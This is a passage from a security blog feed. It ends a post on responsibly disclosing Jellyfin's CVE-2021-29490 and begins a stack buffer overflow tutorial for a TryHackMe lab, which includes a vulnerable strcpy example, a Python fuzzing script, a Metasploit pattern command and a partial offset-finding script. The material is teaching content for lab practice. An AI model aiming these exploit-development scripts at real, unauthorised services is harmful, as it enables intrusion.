&lt;p&gt;Within a week they had replied, and only a couple of days later a fix was deployed. Additionally, knowing their code base better than us, the Jellyfin maintainers were able to find a few other endpoints that also contributed to this problem. They ended up removing the affected endpoints all together. A &lt;a href="https://github.com/jellyfin/jellyfin/security/advisories/GHSA-rgjw-4fwc-9v96"&gt;security advisory&lt;/a&gt; as well as &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29490"&gt;CVE-2021-29490&lt;/a&gt; (currently awaiting analysis) were published, letting everyone know what the problem was and what version patched it.&lt;/p&gt;
&lt;p&gt;All in all, I started trying to root a box. Fell into a deep rabbit hole, but ended up applying some Bug Bounty Hunting skills and came out the other side a better hacker, having found a vulnerability where there shouldn't have been one. I often say that failure tends to teach us more than success, but this time failure had turned into success. It may not have been a fast boot-to-root, but in its own way it had felt a lot sweeter.&lt;/p&gt;
&lt;p&gt;In the process I'd like to think I helped make Jellyfin a bit safer for their users.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">OmegaVoid</dc:creator><pubDate>Thu, 06 May 2021 12:00:00 +0100</pubDate><guid isPermaLink="false">tag:None,2021-05-06:/down-the-jellyfish-hole.html</guid><category>Rants</category><category>rants</category><category>cve</category><category>CVE-2021-29490</category><category>jellyfin</category><category>vulnerability</category><category>tryhackme</category></item><item><title>BinExp Corner: Episode 1 - Stack Buffer Overflows</title><link>/binexp-corner-1-bofs.html</link><description>&lt;p&gt;This is hopefully the first in many in the series. Throughout these we'll look into several topics of Binary Exploitation. I wanted to do something to contribute a bit back to the &lt;a href="http://tryhackme.com"&gt;TryHackMe.com&lt;/a&gt; community since you have all taught me so much. And one thing I've noticed in the past 7 months since I've joined this THM is that a lot of people seem to be a little reticent about doing the stack buffer overflow rooms, because it seems complex and hard to understand — but they are not. So I thought that'd be a good place to start.&lt;/p&gt;
&lt;p&gt;Some of these exploits are really trivial to develop and can even be a somewhat relatively easy way to get points in a few certifications in the security industry.&lt;/p&gt;
&lt;p&gt;We will focus on Windows 32 bit Stack Buffer Overflows that execute shellcode, but it's important to make a point that not all buffer overflows are the same and they can do many things, stack buffer overflows can execute shellcode, overwrite variables, they can alter the flow of a program by forcing the execution of another function, and there are even other types of overflows like Heap Buffer Overflows which focus on a different region of memory and are a technique that was recently used in the Baron Samedit sudo exploit. If you end up curious about these things, be bold, explore, learn more. There are a lot of vulnerabilities out there to be found.&lt;/p&gt;
&lt;p&gt;Before anything else, a big shout out to Tib3rius and TheCyberMentor whose work really started me on the path to understanding these:&lt;/p&gt;
&lt;p&gt;If you'd like to see their content use these links:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=qSnPayW6F7U&amp;amp;list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G"&gt;Overflows Made Easy by The Cyber Mentor&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst"&gt;Buffer Overflows on Tib3rius's github&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Binary Exploitation&lt;/h2&gt;
&lt;p&gt;A quick note before we jump into analyzing the stack architecture, and what it means for us, hackers. Binary exploitation is a world of its own, with a multitude of things you can do when analyzing and exploiting binaries, so we'll leave a lot of the details about binary analysis for another post in the near future.&lt;/p&gt;
&lt;p&gt;For now it suffices that we explore Stack Architecture a little bit.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;There are several registers in 32 bit architecture which are temporary storage built into the CPU, but for simplicity we'll only look at EIP and ESP. These are:
&lt;br&gt;The Instruction Pointer - which points at the next instruction to execute;&lt;br&gt;The Stack Pointer - which points at the top of the stack.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Stack Architecture&lt;/h2&gt;
&lt;p&gt;The user stack is a region of memory that contains the information required to run a program. It will include the saved registers, functions and their variables and arguments. The memory space after the user stack is unused memory and it is used as the stack grows. &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The Base of the stack is actually in higher memory addresses, and it grows to lower memory addresses. Here we will represent it with the base on the bottom of the picture since we're talking exclusively about the stack, but you will more likely see it represented with the base at the top and growing downwards elsewhere because of this.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Each function in a program is given its own separate stack frame, to store local variables, arguments passed to the function etc. Each new stack frame is allocated when a function is called and deallocated when the function returns. &lt;/p&gt;
&lt;p&gt;Time for an example, let's take a look at a program based on this (admittedly ridiculous) piece of code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;num1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;num2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;num3&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;So what happens here?&lt;/p&gt;
&lt;p&gt;&lt;img alt="What the binary would look like in the stack" src="/images/binexp-corner-1/stack1.png"&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The stack will firstly have our main function, and allocate its variables in its frame. ESP (the Stack Pointer) points at the top of the stack.&lt;/li&gt;
&lt;li&gt;When the function is called, the arguments for the function (in this case none) are pushed onto the stack (in reverse order) and then the call instruction is issued which does 2 things:&lt;ol&gt;
&lt;li&gt;Pushes the return address onto the stack&lt;/li&gt;
&lt;li&gt;Modifies EIP to point to the start of the function&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Then the variables of the function get pushed to the stack (in this case num3)&lt;/li&gt;
&lt;li&gt;Every time anything is pushed onto the stack ESP gets incremented so that it keeps pointing at the top of the stack.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;When the function is done executing:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Return address is popped from the stack and written to the EIP so that the program can continue from that position.&lt;/li&gt;
&lt;li&gt;The stack pointer (ESP) is decremented to point back at the top of main's frame (now the top of the stack again).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So, how do we use this to our advantage?&lt;/p&gt;
&lt;h2&gt;The Stack Buffer Overflow&lt;/h2&gt;
&lt;p&gt;Take the following code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[])&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;
&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Here, 2 interesting things happen:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Buffers are loaded into memory in the opposite direction of the stack (towards the bottom of the stack).&lt;/li&gt;
&lt;li&gt;strcpy copies the argument to the buffer without checking the size of the buffer. (&lt;code&gt;printf&lt;/code&gt;, &lt;code&gt;sprintf&lt;/code&gt;, &lt;code&gt;strcat&lt;/code&gt;, &lt;code&gt;strcpy&lt;/code&gt;, and &lt;code&gt;gets&lt;/code&gt; all have this problem)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So, if we feed it 20 bytes of characters everything is fine. However, if we give it more than that something interesting happens.&lt;/p&gt;
&lt;p&gt;We start overwriting things — function variables if they exist, the return address, arguments, etc.&lt;/p&gt;
&lt;p&gt;This is a Stack buffer overflow.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Stack exploitation leading to buffer overflow" src="/images/binexp-corner-1/stack2.png"&gt;&lt;/p&gt;
&lt;p&gt;There's a lot we can do to alter what a program does here. We could overwrite a variable to pass a condition, we can also overwrite the return address which, when the function returns, gets written into the EIP which in turn points at the next instruction to execute, so if we point it towards a function call or a jump we can alter the execution logic of a program. Seems promising doesn't it?&lt;/p&gt;
&lt;p&gt;But another thing we can also do is to overflow the stack even further and insert our own shell code into it. Then when the function returns our shell code will occupy space in the main function frame, and ESP will be pointing at our payload.&lt;/p&gt;
&lt;p&gt;All we have to do is get EIP to point at an address that has the instruction JMP ESP and our payload will execute.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Modern OSs have protection mechanisms like ASLR (Address Space Layout Randomization) which randomly arranges the address space positions of the stack, heap and libraries making exploitation harder. In fact, its a big part of why buffer overflow exploits generate a large number of crash errors in the logs.&lt;br&gt;If you'd like to know more: &lt;a href="https://github.com/r0hi7/BinExp/"&gt;r0hi7's github&lt;/a&gt; is a great source of information on this, and also how to defeat it.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Practice&lt;/h1&gt;
&lt;p&gt;Ok, we know how this "should work" but let's actually do it. We'll go ahead and use OVERFLOW 4 on &lt;a href="https://tryhackme.com/room/bufferoverflowprep"&gt;Buffer Overflow Prep&lt;/a&gt; to exemplify things.&lt;/p&gt;
&lt;p&gt;Our process will take the following steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Writing code to interact with the Application and Fuzzing&lt;/li&gt;
&lt;li&gt;Finding the Offset and Overwriting the Return Address&lt;/li&gt;
&lt;li&gt;Finding Bad Characters&lt;/li&gt;
&lt;li&gt;Finding the Right Module&lt;/li&gt;
&lt;li&gt;Generating Shellcode and the NOP sled&lt;/li&gt;
&lt;li&gt;Getting a shell&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Seems a bit long but it's easier than it seems.&lt;/p&gt;
&lt;h3&gt;Preparation&lt;/h3&gt;
&lt;p&gt;Before all this, to develop an exploit this way we'd have to find a vulnerable binary, and getting it to our own testing system (either by downloading the binary if available, compiling it from source code, etc). The idea is to replicate the conditions of the target on our testing environment. For this we will need a windows VM. For the purpose of the Buffer Overflow Prep room we already have Immunity Debugger installed and the mona plugin. These will make our job a lot easier.&lt;/p&gt;
&lt;p&gt;You can grab the Immunity debugger here: &lt;a href="https://debugger.immunityinc.com/"&gt;https://debugger.immunityinc.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;And you can get mona at: &lt;a href="https://github.com/corelan/mona"&gt;https://github.com/corelan/mona&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Before anything one thing we need to do is set the working folder for mona: &lt;code&gt;!mona config -set workingfolder c:\mona\%p&lt;/code&gt; this way we'll know where the files mona generates get placed.&lt;/p&gt;
&lt;p&gt;However, I'll try to offer alternatives to relying solely on mona for this.&lt;/p&gt;
&lt;p&gt;So let's do this. We'll launch our binary on Immunity Debugger and execute it.&lt;/p&gt;
&lt;p&gt;Remember to reset the binary anytime it crashes.&lt;/p&gt;
&lt;h3&gt;Writing code to interact with the Application and Fuzzing&lt;/h3&gt;
&lt;p&gt;First of all one thing we need to do is figure out if and where an application is vulnerable. There are two ways to do this, a White Box approach and a Black Box approach.&lt;/p&gt;
&lt;p&gt;In a White Box approach you'd analyze the binary (or the source code) for functions you know are vulnerable to stack buffer overflows.&lt;/p&gt;
&lt;p&gt;In a Black Box approach you feed normal input to the application and see the application behaviour, and then feed it an extremely long input and see if the application crashes.&lt;/p&gt;
&lt;p&gt;If it crashes with a really long input, and we know it's a binary running, there's a good chance there's a Buffer Overflow there.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If your binary is running locally it may error out with a Segmentation Fault.&lt;br&gt;
This has become so common that some challenge creators have been known to print "Segmentation Fault" in an application just to create rabbit holes.&lt;br&gt;
Trust your debugger.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In our example we already know it's vulnerable. We'll feed it a long string of A characters and see it fail.&lt;/p&gt;
&lt;p&gt;&lt;img alt="BOF behavior with normal input vs a long string" src="/images/binexp-corner-1/bof1.png"&gt;&lt;/p&gt;
&lt;p&gt;Here we see that the application first responds normally to a test string, and then hangs when we feed it a large payload.&lt;/p&gt;
&lt;p&gt;So, we know this is vulnerable, and we want to attack it. We could do it all by hand, but it's probably a good idea to create a small script to do this for us, that way we don't have to deal with handling all the input by hand and messing up something and spending hours trying to understand why it didn't work. &lt;/p&gt;
&lt;p&gt;We will use Python 2.7 to develop our script for the simple fact that we will not have to deal with encodings in our script implementation. Python3 is fine, just make sure you encode everything correctly. That's outside the scope of this Tutorial, but feel free to play with it.&lt;/p&gt;
&lt;p&gt;Our first step is create a script that will increment our payload until it crashes. This will give us an approximation of where the offset to the return address.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;

&lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;target-ip&amp;gt;&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1337&lt;/span&gt;
&lt;span class="n"&gt;timeout&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;

&lt;span class="n"&gt;fuzzString&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;increment&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fuzzString&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;3000&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;fuzzString&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;increment&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;settimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;connect&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Fuzzing with &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt; bytes&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fuzzString&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;OVERFLOW4 &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;fuzzString&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Could not connect to &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;:&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We execute it and get:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Fuzzing the length of the buffer." src="/images/binexp-corner-1/bof2.png"&gt;&lt;/p&gt;
&lt;p&gt;We can see it breaks at around 2100 characters. Great, we have an approximation of what the offset to the return address, but if we want to know exactly where it is so we can overwrite it.&lt;/p&gt;
&lt;h3&gt;Finding the Offset and Overwriting EIP&lt;/h3&gt;
&lt;p&gt;We'll use a Cyclic Pattern which is a known sequence of characters in a specific order which will help us identify the offset until we hit the return address. &lt;/p&gt;
&lt;p&gt;Metasploit has a tool for exactly this purpose, we'll create a payload a bit bigger than 2100 just to make sure we hit the return address.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2300&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We alter our script to use this.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;

&lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;target-ip&amp;gt;&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1337&lt;/span&gt;
&lt;span class="n"&gt;timeout&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;

&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;cyclic pattern&amp;gt;&amp;quot;&lt;/span&gt;

&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;settimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;connect&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Attempting a string of length = &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;OVERFLOW4 &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
